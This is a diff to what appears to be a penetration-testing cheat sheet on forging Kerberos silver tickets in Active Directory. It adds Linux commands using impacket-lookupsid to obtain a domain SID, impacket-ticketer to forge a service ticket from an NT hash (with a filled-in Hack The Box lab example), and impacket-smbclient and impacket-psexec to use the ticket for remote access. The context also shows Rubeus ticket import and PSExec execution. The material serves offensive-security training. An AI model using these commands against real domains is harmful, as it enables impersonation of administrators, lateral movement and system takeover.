@@ -155,6 +155,7 @@ Golden tickets with "Enterprise admins" SID can be used cross forest boundaries.
 
 Forging a Service Ticket (ST) require machine account password (key) or NT hash of the service account.
 
+### Windows
 ```powershell
 # Get the domain SID
 Import-Module .\PowerView.ps1
@@ -187,7 +188,29 @@ Rubeus.exe ptt /ticket:<ticket.kirbi>
 # Executing PSExec with newly imported ticket
 PSExec.exe -accepteula \\<target-machine-fqdn> <command>
 ```
-* Interesting services to target with a silver ticket :
+### Linux
+```bash
+# Get the Domain SID
+impacket-lookupsid <domain>/<user>@<dc FQDN> -domain-sids
+```
+* Using Ticketer
+```bash
+impacket-ticketer -nthash <nthash> -domain-sid <domain sid> -domain <domain> -spn <spn> <user to impersonate>
+
+#HTB Example
+impacket-ticketer -nthash ff955e93a130f5bb1a6565f32b7dc127 -domain-sid S-1-5-21-2974783224-3764228556-2640795941 -domain inlanefreight.local -spn cifs/sql01.inlanefreight.local Administrator
+```
+* Import the ticket
+```bash
+export KRB5CCNAME=<ticket.ccache>
+
+# SMBClient
+impacket-smbclient -k -no-pass sql01.inlanefreight.local
+
+# PSExec
+impacket-psexec -k -no-pass sql01.inlanefreight.local
+```
+### Interesting services to target with a silver ticket :
 
 | Service Type                                | Service Silver Tickets | Attack |
 |---------------------------------------------|------------------------|--------|
